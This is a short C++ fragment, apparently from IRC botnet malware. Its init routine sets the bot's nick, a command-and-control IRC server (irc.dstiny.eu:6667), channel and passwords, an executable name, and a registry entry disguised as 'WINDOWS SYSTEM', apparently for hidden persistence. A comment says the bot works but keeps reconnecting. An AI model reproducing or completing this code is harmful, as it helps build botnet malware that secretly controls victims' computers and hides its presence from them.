#include "Include.h"
#include "Hell.h"
/* Well it does work its just reconnecting for some reason*/

char blowkey[] = "whatismyip";
int nTimeMs = 60000;

void CConnectIRC::Init(void)
{
	cConf.cNick = "|RoAr|"; 
	cConf.cServer = "irc.dstiny.eu";
	cConf.cPort = 6667;
	cConf.cBotPass = "test";
	cConf.cChan = "#arizon";
	cConf.cChanPass = "PublicRLS";
	cConf.cFileName = "test.exe";
	cConf.cRegName = "WINDOWS SYSTEM";
	IRCRunning = false;
	noReconnect = false;
}